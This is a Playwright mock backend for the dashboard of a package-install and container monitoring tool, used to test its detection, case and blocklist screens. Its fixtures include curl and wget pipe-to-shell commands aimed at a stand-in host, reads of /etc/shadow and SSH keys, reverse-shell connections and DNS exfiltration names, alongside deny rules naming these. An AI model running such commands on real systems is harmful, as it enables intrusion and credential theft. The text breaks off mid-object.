import type { Page, Route, WebSocketRoute } from '@playwright/test';
import type {
  AuditEntry,
  Blocklist,
  BlockList,
  Case,
  Change,
  DecisionEffect,
  DecisionPreview,
  DemoRun,
  DemoScenario,
  DemoState,
  Event,
  Evidence,
  Info,
  InstallScan,
  InstallSession,
  InstallViolation,
  Level,
  OsvResult,
  PolicyDefaults,
  Preview,
  Proposal,
  ProposalChange,
  Rule,
  Stats,
  Summary,
  Timeline,
  Verdict,
  WsMessage,
} from '../src/lib/types';
import { ACTOR, MockAuth } from './mock-auth';

// 계약(Claude Docs 「API 계약」 탭, 2026-10-15)을 따르는 상태 있는 가짜 백엔드.
// page.route 로 /api/** 를, page.routeWebSocket 으로 /ws/events 를 가로챈다. 실제 서버에는 닿지 않는다.

// 처리자(decidedBy · appliedBy · by)는 로그인한 계정의 표시 이름 — 기본 관리자 표시 이름이 ACTOR (backend auth.Actor.Name)
export { ACTOR };

const ago = (now: number, sec: number) => new Date(now - sec * 1000).toISOString();
const levelOf = (v: Verdict): Level => (!v.matched ? 'normal' : v.action !== 'kill' ? 'alert' : v.enforced ? 'killed' : 'held');

function ev(now: number, sec: number, container: string, image: string, e: Partial<Event> & Pick<Event, 'kind' | 'comm'>): Event {
  // W20: 백엔드처럼 connect 에는 dnsTraced 를 늘 명시한다(가짜 /api/info dnsResolve 'ok' → true)
  const dns = e.kind === 'connect' ? { dnsTraced: true } : {};
  return { timestamp: ago(now, sec), containerId: `${container.replace(/[^a-z0-9]/g, '')}0123456789abcdef`.slice(0, 64), containerName: container, imageName: image, pid: 4242, ...dns, ...e };
}
const kill = (event: Event, ruleId: string, reason: string): Verdict => ({ event, matched: true, ruleId, action: 'kill', reason, enforced: true });
const alert = (event: Event, ruleId: string, reason: string): Verdict => ({ event, matched: true, ruleId, action: 'alert', reason });
const ok = (event: Event): Verdict => ({ event, matched: false });

// ── 10/30 DNS 질의 규칙(kind: dns) · 격리 타임라인 · 시연 — 계약 contract-1030 §1 · §2 · §3 ──
// 48자 hex 라벨(유출 흉내) — deploy/demo scn_dns_exfil 과 같은 이름
export const DNS_EXFIL_NAME = `${'deadbeef'.repeat(6)}.exfil.example`;
// dns 이벤트: dstHost = 질의 이름, qtype = 대문자, dstIp · dstPort 는 컨테이너 네임서버(dnsTraced 는 넣지 않는다)
export function dnsEvent(now: number, sec: number, container: string, image: string, name: string, qtype = 'A', comm = 'python3'): Event {
  return ev(now, sec, container, image, { kind: 'dns', comm, dstHost: name, qtype, dstIp: '127.0.0.11', dstPort: 53 });
}
// WS 로 보낼 dns 판정 — 기본은 runtime-dns-exfil 경고(긴 라벨)
export function dnsVerdict(container: string, o: { name?: string; qtype?: string; ruleId?: string; action?: 'alert' | 'kill'; reason?: string; dryRun?: boolean } = {}): Verdict {
  const name = o.name ?? DNS_EXFIL_NAME;
  const qtype = o.qtype ?? 'A';
  const e = dnsEvent(Date.now(), 0, container, 'demo/x:1', name, qtype);
  const reason = o.reason ?? (qtype === 'TXT' ? `금지 질의 유형: ${qtype} — ${name}` : `긴 DNS 라벨(유출 의심): ${name} (라벨 48자 > 40)`);
  if (o.action === 'kill') return { ...kill(e, o.ruleId ?? 'sandbox-dns', reason), enforced: !o.dryRun, dryRun: !!o.dryRun };
  return alert(e, o.ruleId ?? 'runtime-dns-exfil', reason);
}
// 기본 정책 끝에 더해지는 dns 규칙 2개(계약 §1 기본 정책 그대로)
export function dnsRules(): Rule[] {
  return [
    { id: 'runtime-dns-exfil', description: 'DNS 질의로 데이터를 실어 보내는 패턴(긴 라벨 · 긴 이름 · TXT 질의). 런타임은 경고만', kind: 'dns', action: 'alert', maxLabelLength: 40, maxNameLength: 120, denyQtypes: ['TXT'] },
    {
      id: 'sandbox-dns', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 도메인 질의 자체를 격리 (연결 전 유출 · DNS 터널링 차단). sg-vm 실측 전까지 시험 운영',
      kind: 'dns', action: 'kill', dryRun: true, containers: ['sg-install-*'],
      allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'static.crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
      maxLabelLength: 40,
    },
  ];
}
// 격리 타임라인(계약 §3) — 탐지 기준 ms 오프셋. 키를 null 로 주면 뺀다(없는 구간 「—」 재현)
export const TL = { matchMs: 12, evidenceStartMs: 15, evidenceDoneMs: 310, killMs: 420, notifyMs: 431 };
export function timeline(detectedAt: number, o: Partial<{ matchMs: number; evidenceStartMs: number | null; evidenceDoneMs: number | null; killMs: number | null; notifyMs: number | null }> = {}): Timeline {
  const at = (ms: number) => new Date(detectedAt + ms).toISOString();
  const v = { ...TL, ...o };
  const t: Timeline = { detectedAt: at(0), matchedAt: at(v.matchMs) };
  if (v.evidenceStartMs != null) t.evidenceStartedAt = at(v.evidenceStartMs);
  if (v.evidenceDoneMs != null) t.evidenceDoneAt = at(v.evidenceDoneMs);
  if (v.killMs != null) t.killedAt = at(v.killMs);
  if (v.notifyMs != null) t.notifiedAt = at(v.notifyMs);
  return t;
}
export const DEMO_SCENARIOS: DemoScenario[] = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil'];
// Run 객체(계약 §2) — unix 초 기준 id · 컨테이너 이름
export function demoRun(scenario: DemoScenario, installId: string, unix = Math.floor(Date.now() / 1000)): DemoRun {
  return { id: `demo-${unix}`, scenario, container: `sg-install-demo-${unix}`, installId, startedAt: new Date(unix * 1000).toISOString(), finishedAt: null, status: 'running', exitCode: null, simulated: true };
}
// SSE 본문: 시작 주석 · 중간 ping 주석을 섞는다(백엔드 api/chat.go 와 같은 모양)
export const sseBody = (events: [string, unknown][]) =>
  ': start\n\n' + events.map(([e, d], i) => (i === 1 ? ': ping\n\n' : '') + `event: ${e}\ndata: ${JSON.stringify(d)}\n\n`).join('');

// 11/04 종합 판정: 설치 세션 응답의 scan(읽을 때 계산) — 계약 모양. 건너뜀은 id '' · status skipped
export function installScan(o: Partial<InstallScan> & Pick<InstallScan, 'status' | 'label'>): InstallScan {
  return { id: '', version: '', riskScore: null, installThreats: 0, threats: 0, vulnCount: 0, error: '', skip: '', reused: false, ...o };
}
const INSTALL_CTR = 'sg-install-pip-1792043525-24739';
const PYIMG = 'python:3.12-slim';

export class MockBackend {
  now = Date.now();
  // 10/20: dnsResolve · notify(알림 채널 상태 — 호스트만) — 메인 백엔드 /api/info 와 같은 모양
  info: Info = {
    source: 'mock',
    gadgets: ['exec', 'open', 'connect'],
    enforceKill: true,
    authRequired: false,
    gadgetVersion: 'v0.56.1',
    watchContainers: [],
    ignoreContainers: ['supplyguard-*'],
    dnsResolve: 'ok',
    // 10/20: AI 도우미(/api/chat) 켜짐 여부 — 기본은 꺼짐(기존 시나리오는 가이드 탭 하나). 켜는 시나리오는 assistant-chat-1020.spec
    chat: false,
    notify: { enabled: true, channels: [{ name: 'webhook', host: 'hooks.example.test', sent: 3, failed: 0, dropped: 0, queued: 0 }], sent: 3, failed: 0, dropped: 0, suppressed: 0 },
  };
  // 라우트 자체가 없는 것처럼(404 + 텍스트) 굴 경로 접두사 — 「백엔드 미지원」 재현
  unsupported = new Set<string>();
  osvFail = false;
  // 목록 응답에서 violations · activity 를 빼고 violationCount 만 준다(계약: 상세에만 있을 수 있음)
  listOmitsDetail = false;
  requests: { method: string; path: string; auth: string | null; body?: string }[] = [];
  // 10/20 인증(W16): 기본은 관리자 active 세션 · OTP 꺼짐. 로그인 단계 · 계정 · 라이선스 · 인증 감사도 여기서
  auth = new MockAuth();
  // /api/chat 가짜 SSE(메인 백엔드 api/chat.go 계약). status 가 200 이 아니면 시작 전 JSON 오류 {error}
  chatReply: { status?: number; error?: string; events?: [string, unknown][] } | null = null;
  ws: WebSocketRoute | null = null;
  notifyTests = 0;
  // W18: 새 기본 규칙(GET /api/policies/defaults) — 기본은 차이 없음(띠 없음) · kill 직전 증거(GET /api/evidence)
  policyDefaults: PolicyDefaults = { missing: [], differs: [] };
  evidence: Evidence[] = [];
  // W19: 실시간 끊김 재현 — wsRefuse 동안 새 연결을 바로 닫고, dropWs() 는 지금 연결을 끊는다. failing: 경로 → 상태 코드(최초 로드 실패 재현)
  wsRefuse = false;
  failing = new Map<string, number>();
  // 10/30 시연(계약 §2 mock 소스): info.demo 가 true 일 때만 /api/demo 경로가 있다. demoDown → 503, demoRefused → 거부 세션(202 refused)
  demo: DemoState = { enabled: false, scenarios: DEMO_SCENARIOS, running: null, last: null };
  demoDown = false;
  demoRefused = false;
  demoStepMs = 250; // 모의 재생 간격
  private demoTimers: number[] = [];
  // 10/30: 수집량에 dns 를 넣을지(enableDns) — 기본은 옛 백엔드처럼 없음
  dnsCollected = false;
  dropWs() {
    void this.ws?.close({ code: 1006, reason: 'drop' });
  }
  private seq = 100;

  rules: Rule[] = [
    { id: 'sensitive-files', description: '자격 증명·계정 파일 접근', kind: 'open', action: 'kill', denyPaths: ['/etc/shadow', '/root/.ssh/', '/home/*/.ssh/*'] },
    { id: 'no-shell-download', description: '셸 다운로더 실행', kind: 'exec', action: 'kill', denyComms: ['curl', 'wget'] },
    { id: 'pipe-to-shell', description: 'curl | sh', kind: 'exec', action: 'kill', denyArgs: ['| sh', '| bash'] },
    { id: 'reverse-shell-ports', description: '리버스 셸 포트', kind: 'connect', action: 'kill', denyPorts: [4444, 1337] },
    // backend/policies/default.yaml 과 같게 — allowHosts 없음(오탐 예외는 allowCidrs IP/32)
    { id: 'egress-allowlist', description: '허용 목적지 외 통신', kind: 'connect', action: 'alert', allowPorts: [443, 80, 53], allowCidrs: ['10.0.0.0/8'] },
    { id: 'sandbox-egress', description: '설치 중 외부 통신', kind: 'connect', action: 'kill', containers: ['sg-install-*'], allowHosts: ['pypi.org', 'files.pythonhosted.org'] },
    { id: 'sandbox-secrets', description: '설치 중 비밀 파일', kind: 'open', action: 'kill', containers: ['sg-install-*'], denyPaths: ['/root/.ssh/', '/etc/shadow'] },
    { id: 'blocklist-hosts', description: '차단 목록 도메인 (시스템)', kind: 'connect', action: 'kill', denyHosts: ['cdn.colourama.test'] },
  ];

  installs: InstallSession[];
  cases: Case[];
  proposals: Proposal[];
  blocklist: Blocklist;
  changes: Change[];
  audit: AuditEntry[];
  recent: Verdict[];
  stats: Stats;
  // 종합(10/16): 1분 단위 수집량 — 최근 26시간, 결정적인 값
  collected: { minute: number; exec: number; open: number; connect: number; dns?: number }[] = [];
  osv: Record<string, number> = { 'PyPI:reqeusts': 0, 'PyPI:requests': 16, 'npm:tiny-git-dep': 0, 'PyPI:colourama': 0 };

  constructor() {
    const now = this.now;
    const reqViolations: InstallViolation[] = [
      { ...kill(ev(now, 610, INSTALL_CTR, PYIMG, { kind: 'exec', comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '파이프로 셸 실행'), count: 1 },
      { ...kill(ev(now, 610, INSTALL_CTR, PYIMG, { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' }), 'no-shell-download', '셸 다운로더'), count: 1 },
      { ...kill(ev(now, 609, INSTALL_CTR, PYIMG, { kind: 'open', comm: 'python', path: '/root/.ssh/id_rsa' }), 'sandbox-secrets', '비밀 파일'), count: 1 },
      { ...kill(ev(now, 609, INSTALL_CTR, PYIMG, { kind: 'open', comm: 'python', path: '/etc/shadow' }), 'sensitive-files', '계정 파일'), count: 1 },
      { ...kill(ev(now, 608, INSTALL_CTR, PYIMG, { kind: 'connect', comm: 'python', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' }), 'sandbox-egress', '설치 중 외부 통신'), count: 1 },
      { ...kill(ev(now, 608, INSTALL_CTR, PYIMG, { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' }), 'reverse-shell-ports', '리버스 셸 포트'), count: 1 },
    ];
    const npmCtr = 'sg-install-npm-1792043001-11873';
    const gitViolation: InstallViolation = {
      ...alert(ev(now, 900, npmCtr, 'node:22-slim', { kind: 'connect', comm: 'git', dstIp: '140.82.112.3', dstPort: 9418, dstHost: 'github.com' }), 'egress-allowlist', '허용 목적지 외 통신'),
      count: 2,
    };
    const base = (id: string, manager: InstallSession['manager'], pkgs: string[], startSec: number, durSec: number | null, status: InstallSession['status'], extra: Partial<InstallSession> = {}): InstallSession => ({
      id,
      manager,
      packages: pkgs,
      container: `sg-install-${manager}-${1792040000 + startSec}-${id.slice(-4)}`,
      containerId: `${id}abcdef0123456789`,
      image: manager === 'pip' ? PYIMG : manager === 'npm' ? 'node:22-slim' : 'rust:1-slim',
      startedAt: ago(now, startSec),
      finishedAt: durSec === null ? null : ago(now, startSec - durSec),
      exitCode: durSec === null ? null : 0,
      status,
      caseId: null,
      refusedBy: null,
      violations: [],
      activity: { kinds: { exec: 2, open: 14, connect: 3 }, hosts: [{ host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 3, level: 'normal' }], programs: [{ comm: manager, args: `${manager} install ${pkgs.join(' ')}`, count: 1, level: 'normal' }] },
      ...extra,
    });
    this.installs = [
      base('ins-0013', 'npm', ['left-pad'], 20, null, 'running', { scanId: 'scan-0103', scan: installScan({ id: 'scan-0103', status: 'running', label: 'npm left-pad', version: '1.3.0' }) }),
      base('ins-0012', 'pip', ['./reqeusts'], 612, 4, 'isolated', {
        container: INSTALL_CTR,
        exitCode: 137,
        caseId: 'case-0004',
        scanId: null,
        scanSkip: 'local', // 11/04: 로컬 패키지 — 정적 검사 건너뜀 → 지금의 OSV 칸(시연 대본 1:15)
        scan: installScan({ status: 'skipped', label: 'pip ./reqeusts', skip: 'local' }),
        violations: reqViolations,
        activity: {
          kinds: { exec: 3, open: 2, connect: 5 },
          hosts: [
            { host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 3, level: 'normal' },
            { host: 'cdn.reqeusts-update.test', ip: '203.0.113.7', port: 8081, count: 1, level: 'killed' },
            { host: 'cdn.reqeusts-update.test', ip: '203.0.113.7', port: 4444, count: 1, level: 'killed' },
          ],
          programs: [
            { comm: 'pip', args: 'pip install --no-cache-dir ./reqeusts', count: 1, level: 'normal' },
            { comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh', count: 1, level: 'killed' },
            { comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh', count: 1, level: 'killed' },
          ],
        },
      }),
      base('ins-0011', 'npm', ['tiny-git-dep'], 905, 9, 'warned', {
        container: npmCtr,
        caseId: 'case-0003',
        violations: [gitViolation],
        scanId: 'scan-0102',
        scan: installScan({ id: 'scan-0102', status: 'done', verdict: 'clean', label: 'npm tiny-git-dep', version: '1.0.0', riskScore: 0 }), // 런타임 경고 + 정적 정상 → 엇갈림 한 줄
      }),
      base('ins-0010', 'pip', ['requests'], 1000, 6, 'passed', {
        scanId: 'scan-0101',
        scan: installScan({ id: 'scan-0101', status: 'done', verdict: 'clean', label: 'pip requests', version: '2.32.3', riskScore: 0, reused: true }), // 24시간 안 검사 재사용
      }),
      base('ins-0009', 'cargo', ['ripgrep'], 1100, 30, 'passed', { scanId: null, scanSkip: 'unsupported', scan: installScan({ status: 'skipped', label: 'cargo ripgrep', skip: 'unsupported' }) }),
      base('ins-0008', 'pip', ['flask'], 1200, null, 'unknown', {
        containerExitedAt: ago(now, 1190),
        scanId: 'scan-0100',
        scan: installScan({ id: 'scan-0100', status: 'failed', label: 'pip flask', version: '3.1.0', error: 'GuardDog 시간 초과(120초)' }),
      }),
      base('ins-0007', 'pip', ['numpy==1.21.0'], 1300, 12, 'failed', {
        exitCode: 1,
        scanId: 'scan-0099',
        scan: installScan({ id: 'scan-0099', status: 'done', verdict: 'vulnerable', label: 'pip numpy==1.21.0', version: '1.21.0', riskScore: 1.5, vulnCount: 5 }),
      }),
      base('ins-0006', 'pip', ['colourama'], 1500, 3, 'isolated', {
        exitCode: 137,
        caseId: 'case-0002',
        violations: [{ ...kill(ev(now, 1498, 'sg-install-pip-x', PYIMG, { kind: 'connect', comm: 'python', dstIp: '203.0.113.9', dstPort: 443, dstHost: 'cdn.colourama.test' }), 'sandbox-egress', '설치 중 외부 통신'), count: 2 }],
      }),
    ];
    this.cases = [
      { id: 'case-0005', source: 'runtime', installId: null, container: 'pkg-reqeusts', label: 'pkg-reqeusts', image: 'demo/reqeusts:1.0.2', package: null, openedAt: ago(now, 60), level: 'killed', violations: 5, ruleIds: ['pipe-to-shell', 'no-shell-download', 'sensitive-files', 'egress-allowlist', 'reverse-shell-ports'], state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null },
      { id: 'case-0004', source: 'install', installId: 'ins-0012', container: INSTALL_CTR, label: 'pip ./reqeusts', image: PYIMG, package: 'pip:reqeusts', openedAt: ago(now, 608), level: 'killed', violations: 6, ruleIds: ['pipe-to-shell', 'no-shell-download', 'sandbox-secrets', 'sensitive-files', 'sandbox-egress', 'reverse-shell-ports'], state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null },
      { id: 'case-0003', source: 'install', installId: 'ins-0011', container: npmCtr, label: 'npm tiny-git-dep', image: 'node:22-slim', package: 'npm:tiny-git-dep', openedAt: ago(now, 900), level: 'alert', violations: 2, ruleIds: ['egress-allowlist'], state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null },
      { id: 'case-0002', source: 'install', installId: 'ins-0006', container: 'sg-install-pip-x', label: 'pip colourama', image: PYIMG, package: 'pip:colourama', openedAt: ago(now, 1498), level: 'killed', violations: 2, ruleIds: ['sandbox-egress'], state: 'closed', decision: 'malicious', decidedAt: ago(now, 1400), decidedBy: ACTOR, note: '타이포스쿼팅', proposalId: 'prop-0001', closedAt: ago(now, 1390) },
    ];
    this.proposals = [
      { id: 'prop-0001', caseId: 'case-0002', decision: 'malicious', state: 'applied', createdAt: ago(now, 1400), createdBy: ACTOR, appliedAt: ago(now, 1390), appliedBy: ACTOR, changes: [{ op: 'block', list: 'packages', value: 'pip:colourama' }, { op: 'block', list: 'hosts', value: 'cdn.colourama.test' }], notes: [] },
    ];
    this.blocklist = {
      packages: [{ value: 'pip:colourama', caseId: 'case-0002', at: ago(now, 1390), by: ACTOR }],
      images: [],
      hosts: [{ value: 'cdn.colourama.test', caseId: 'case-0002', at: ago(now, 1390), by: ACTOR }],
    };
    this.changes = [{ id: 'chg-0001', at: ago(now, 1390), by: ACTOR, kind: 'proposal_applied', caseId: 'case-0002', proposalId: 'prop-0001', summary: '패키지 pip:colourama 차단 · 도메인 1개 차단' }];

    // 런타임 공격(pkg-reqeusts) + 정상 컨테이너 + 설치 검사 컨테이너 이벤트
    const RT = 'pkg-reqeusts';
    const RTIMG = 'demo/reqeusts:1.0.2';
    const runtime: Verdict[] = [
      kill(ev(now, 58, RT, RTIMG, { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' }), 'reverse-shell-ports', '리버스 셸 포트 4444'),
      alert(ev(now, 58, RT, RTIMG, { kind: 'connect', comm: 'python', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' }), 'egress-allowlist', '허용 목적지 외 통신'),
      kill(ev(now, 59, RT, RTIMG, { kind: 'open', comm: 'python', path: '/etc/shadow' }), 'sensitive-files', '계정 파일 접근'),
      kill(ev(now, 59, RT, RTIMG, { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' }), 'no-shell-download', '셸 다운로더'),
      kill(ev(now, 60, RT, RTIMG, { kind: 'exec', comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '파이프로 셸 실행'),
    ];
    const normal: Verdict[] = [
      ok(ev(now, 5, 'web-api', 'demo/web-api:2.3', { kind: 'open', comm: 'python', path: '/app/config.yaml' })),
      ok(ev(now, 6, 'web-api', 'demo/web-api:2.3', { kind: 'connect', comm: 'python', dstIp: '10.0.0.5', dstPort: 5432 })),
      ok(ev(now, 7, 'worker', 'demo/worker:1.4', { kind: 'exec', comm: 'node', args: 'node jobs/run.js' })),
      ok(ev(now, 8, 'worker', 'demo/worker:1.4', { kind: 'connect', comm: 'node', dstIp: '151.101.0.223', dstPort: 443, dstHost: 'registry.npmjs.org' })),
    ];
    const sandbox: Verdict[] = [reqViolations[0], reqViolations[5]].map((v) => {
      const { count: _c, ...rest } = v;
      void _c;
      return { ...rest, event: { ...rest.event, timestamp: ago(now, 30) } };
    });
    this.recent = [...normal, ...sandbox, ...runtime];
    const m0 = Math.floor(now / 60000);
    for (let m = m0 - 26 * 60; m <= m0; m++) this.collected.push({ minute: m, exec: 2 + (m % 3), open: 10 + (m % 7), connect: 3 + (m % 5) });

    // 감사 로그: 위반만 저장(+caseId · install)
    const auditRows: Omit<AuditEntry, 'id'>[] = [
      // 경고도 같은 컨테이너의 열린 런타임 건에 묶인다(결정 2026-10-15)
      ...runtime.map((v) => ({ ...v, caseId: 'case-0005', install: null })),
      ...reqViolations.map(({ count: _c, ...v }) => (void _c, { ...v, caseId: 'case-0004', install: { id: 'ins-0012', label: 'pip ./reqeusts' } })),
      { ...gitViolation, event: { ...gitViolation.event, timestamp: ago(now, 902) }, caseId: 'case-0003', install: { id: 'ins-0011', label: 'npm tiny-git-dep' } },
      { ...gitViolation, caseId: 'case-0003', install: { id: 'ins-0011', label: 'npm tiny-git-dep' } },
    ];
    auditRows.sort((a, b) => b.event.timestamp.localeCompare(a.event.timestamp));
    this.audit = auditRows.map((r, i) => ({ ...r, id: 200 - i }));

    const trend = Array.from({ length: 60 }, (_, i) => ({ t: ago(now, (59 - i) * 5), exec: 3, open: 8, connect: 4, violations: i % 12 === 0 ? 6 : i % 7 === 0 ? 1 : 0 }));
    this.stats = {
      timestamp: new Date(now).toISOString(),
      totalEvents: 12890,
      eventsLastMinute: 540,
      eventsPerSec: 9.6,
      totalViolations: 90,
      riskScore: 0,
      killed: [{ id: 'c1', name: RT, at: ago(now, 58) }, { id: 'c2', name: INSTALL_CTR, at: ago(now, 608) }],
      killedCount: 2,
      topContainers: [{ name: RT, violations: 5 }],
      trend,
      wsClients: 1,
      dropped: 0,
      enforceKill: true,
      source: 'mock',
    };
  }

  // ── 시나리오 도우미 ──
  empty() {
    this.installs = [];
    this.cases = [];
    this.proposals = [];
    this.changes = [];
    this.blocklist = { packages: [], images: [], hosts: [] };
    return this;
  }
  case(id: string) {
    return this.cases.find((c) => c.id === id)!;
  }
  // 11/04 종합 판정: 런타임 통과 + 정적 악성(정적만 악성이면 건을 열지 않는다 — caseId 없음)
  staticMalicious(id = 'ins-0014') {
    const now = Date.now();
    const s: InstallSession = {
      id, manager: 'pip', packages: ['reqeusts'], container: `sg-install-pip-${Math.floor(now / 1000)}-${id.slice(-4)}`, containerId: `${id}abcdef0123456789`, image: PYIMG,
      startedAt: ago(now, 30), finishedAt: ago(now, 24), exitCode: 0, status: 'passed', caseId: null, refusedBy: null, violations: [],
      activity: { kinds: { exec: 1, open: 9, connect: 2 }, hosts: [{ host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 2, level: 'normal' }], programs: [{ comm: 'pip', args: 'pip install reqeusts', count: 1, level: 'normal' }] },
      scanId: 'scan-0104',
      scan: installScan({ id: 'scan-0104', status: 'done', verdict: 'malicious', label: 'pip reqeusts', version: '1.0.2', riskScore: 8.6, installThreats: 2, threats: 3 }),
    };
    this.installs.unshift(s);
    return s;
  }
  // 11/04: 정적 검사만 실행 중인 끝난 세션(런타임 통과) → finishScan 으로 done 전환 — 상세 2초 폴링 조건(running || scan.status==='running')
  scanRunning(id = 'ins-0015') {
    const now = Date.now();
    const s: InstallSession = {
      id, manager: 'pip', packages: ['pyyaml'], container: `sg-install-pip-${Math.floor(now / 1000)}-${id.slice(-4)}`, containerId: `${id}abcdef0123456789`, image: PYIMG,
      startedAt: ago(now, 12), finishedAt: ago(now, 6), exitCode: 0, status: 'passed', caseId: null, refusedBy: null, violations: [],
      activity: { kinds: { exec: 1, open: 9, connect: 2 }, hosts: [{ host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 2, level: 'normal' }], programs: [{ comm: 'pip', args: 'pip install pyyaml', count: 1, level: 'normal' }] },
      scanId: 'scan-0105',
      scan: installScan({ id: 'scan-0105', status: 'running', label: 'pip pyyaml', version: '6.0.3' }),
    };
    this.installs.unshift(s);
    return s;
  }
  finishScan(id: string, patch: Partial<InstallScan> = { verdict: 'clean', riskScore: 0 }) {
    const s = this.installs.find((x) => x.id === id)!;
    s.scan = { ...s.scan!, status: 'done', ...patch };
    return s;
  }
  // 10/30: dns 규칙 2개 + dns 이벤트(런타임 경고 2 · 설치 ins-0012 의 sandbox-dns 격리 대상 1) + 활동 요약 「조회」 + 수집량 dns
  enableDns() {
    const now = this.now;
    this.rules.push(...dnsRules());
    const RT = 'pkg-reqeusts';
    const RTIMG = 'demo/reqeusts:1.0.2';
    const rt: Verdict[] = [
      alert(dnsEvent(now, 57, RT, RTIMG, DNS_EXFIL_NAME, 'A'), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
      alert(dnsEvent(now, 57, RT, RTIMG, 'data.exfil.example', 'TXT'), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
    ];
    this.recent.unshift(...rt);
    const top = Math.max(0, ...this.audit.map((a) => a.id));
    this.audit.unshift(...rt.map((v, i) => ({ ...v, id: top + 2 - i, caseId: 'case-0005', install: null })));
    const c5 = this.cases.find((c) => c.id === 'case-0005');
    if (c5) {
      c5.violations += 2;
      c5.ruleIds = [...c5.ruleIds, 'runtime-dns-exfil'];
    }
    const s = this.installs.find((x) => x.id === 'ins-0012');
    if (s) {
      const v: InstallViolation = { ...kill(dnsEvent(now, 609, s.container, PYIMG, 'cdn.reqeusts-update.test', 'A'), 'sandbox-dns', '허용 목록 밖 도메인 질의: cdn.reqeusts-update.test (A)'), enforced: false, dryRun: true, count: 1 };
      s.violations = [...(s.violations ?? []), v];
      if (s.activity) s.activity.kinds = { ...s.activity.kinds, dns: 4 };
      const c4 = this.cases.find((c) => c.id === 'case-0004');
      if (c4) {
        c4.violations += 1;
        c4.ruleIds = [...c4.ruleIds, 'sandbox-dns'];
      }
      this.audit.unshift({ ...v, caseId: 'case-0004', install: { id: 'ins-0012', label: 'pip ./reqeusts' }, id: top + 3 });
      this.audit.sort((a, b) => b.id - a.id);
    }
    this.dnsCollected = true;
    for (const c of this.collected) c.dns = 1 + (c.minute % 2);
    return this;
  }
  // 10/30: 격리 타임라인 — ins-0012(설치) · case-0005(런타임)의 첫 kill 판정 + 그 감사 행. 설치 쪽은 알림 구간 없음(「—」 재현)
  enableIsolation() {
    const s = this.installs.find((x) => x.id === 'ins-0012');
    const first = s?.violations?.[0];
    if (s && first) {
      const tl = timeline(Date.parse(first.event.timestamp), { notifyMs: null });
      first.timeline = tl;
      const row = this.audit.find((a) => a.caseId === 'case-0004' && a.ruleId === first.ruleId);
      if (row) row.timeline = tl;
      s.isolation = { auditId: row?.id ?? 0, timeline: tl };
    }
    const c5 = this.cases.find((c) => c.id === 'case-0005');
    const row5 = this.audit.filter((a) => a.caseId === 'case-0005' && a.action === 'kill').sort((a, b) => a.event.timestamp.localeCompare(b.event.timestamp))[0];
    if (c5 && row5) {
      row5.timeline = timeline(Date.parse(row5.event.timestamp), { killMs: 380, notifyMs: 390 });
      c5.isolation = { auditId: row5.id, timeline: row5.timeline };
    }
    const r = this.recent.find((v) => v.event.containerName === 'pkg-reqeusts' && v.action === 'kill');
    if (r && row5?.timeline) r.timeline = row5.timeline;
    return this;
  }
  // 10/30: 시연 켜기(/api/info.demo = true + /api/demo 경로)
  enableDemo() {
    this.info.demo = true;
    this.demo.enabled = true;
    return this;
  }
  // 시연 모의 재생(계약 §2 mock 소스): 세션 → 정상 이벤트 → 시나리오 이벤트 순서대로, 첫 kill 판정에서 멈춘다
  private startDemo(run: DemoRun) {
    const ctr = run.container;
    const at = (ms = 0) => new Date(Date.now() + ms).toISOString();
    const session: InstallSession = {
      id: run.installId, manager: 'pip', packages: ['./reqeusts'], container: ctr, containerId: `${run.installId}abcdef0123456789`, image: PYIMG,
      startedAt: run.startedAt, finishedAt: null, exitCode: null, status: 'running', caseId: null, refusedBy: null, violations: [],
      activity: { kinds: {}, hosts: [], programs: [] },
    };
    this.installs.unshift(session);
    const e = (x: Partial<Event> & Pick<Event, 'kind' | 'comm'>) => ev(Date.now(), 0, ctr, PYIMG, x);
    const V: Record<DemoScenario, (() => Verdict)[]> = {
      shell: [
        () => kill(e({ kind: 'exec', comm: 'sh', args: 'sh -c wget -qO- http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '파이프로 셸 실행'),
        () => kill(e({ kind: 'open', comm: 'python3', path: '/etc/shadow' }), 'sandbox-secrets', '설치 중 비밀 파일'),
      ],
      revshell: [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 4444 }), 'reverse-shell-ports', '리버스 셸 포트 4444')],
      'direct-ip': [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 443 }), 'sandbox-egress', '설치 중 외부 통신')],
      domain: [
        () => ({ ...kill(e({ kind: 'dns', comm: 'python3', dstHost: 'example.com', qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'sandbox-dns', '허용 목록 밖 도메인 질의: example.com (A)'), enforced: false, dryRun: true }),
